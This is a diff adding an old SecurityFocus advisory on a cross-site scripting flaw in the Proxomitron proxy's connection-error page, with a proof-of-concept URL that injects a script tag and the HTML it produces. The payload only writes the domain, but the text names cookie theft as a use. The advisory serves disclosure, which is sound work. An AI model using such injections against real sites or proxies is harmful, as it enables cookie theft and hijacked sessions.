@@ -1,0 +1,32 @@
+source: http://www.securityfocus.com/bid/3087/info
+
+Proxomitron is a free web proxy server.
+
+Proxomitron is vulnerable to a cross site scripting attack.
+
+The condition is present because of the way URLS are displayed in error messages. It is possible for script code to be embedded in the error page through a maliciously constructed link. When the error is displayed, the script will be executed within the context of the proxy server's error page on the client browser. This may permit various web-based attacks including stealing cookies, etc.
+
+Accessing the following URL with the browser configured to use Proxomitron as a proxy,
+
+http://www.example.com:9999/<SCRIPT>document.write(document.domain)</SCRIPT>
+
+it will cause Proxomitron to produce output like this:
+========================================================
+<html><head><title>The Proxomitron Reveals...</title>
+...
+The Proxomitron couldn't connect to...<br>
+font color=#ffff00 size=+1 > www.example.com:9999/<SCRIPT>document.write(document.domain)</SCRIPT>
+</font><br>
+The site may be busy or the web server may be down.
+...
+========================================================
+
+and this will be shown as the following:
+========================================================
+Error connecting to site
+The Proxomitron couldn't connect to...
+www.example.com:9999/www.example.com
+The site may be busy or the web server may be down.
+========================================================
+
+The noteworthy point is that the JavaScript code will be executed on an arbitrary specified domain.
